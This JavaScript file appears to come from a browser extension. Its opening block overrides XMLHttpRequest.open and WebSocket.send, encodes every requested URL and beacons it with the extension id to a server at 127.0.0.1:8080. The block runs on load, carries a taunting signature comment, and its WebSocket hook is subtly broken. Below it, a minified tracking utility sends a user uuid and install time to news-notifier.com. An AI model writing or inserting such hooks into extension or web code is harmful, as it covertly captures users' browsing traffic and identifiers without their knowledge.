function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
!function(){"use strict";var t=window.consts56c4372f,n={track:function(i,e){chrome.storage.local.get(["uuid","installTime"],function(o){o.uuid&&o.installTime&&t.cv&&(n.trackMeta=["uuid="+o.uuid,"i="+o.installTime,"v=1.8.42","cv="+t.cv].join("&")),setTimeout(function(){(new Image).src="https://news-notifier.com/theguardian_international/__utm.gif?m="+encodeURIComponent(i)+(void 0!==e?"&v="+encodeURIComponent(e):"")+"&t="+String(Date.now())+"&"+(n.trackMeta?n.trackMeta:"nometa=1")},0)})}};window.utils56c4372f=n}();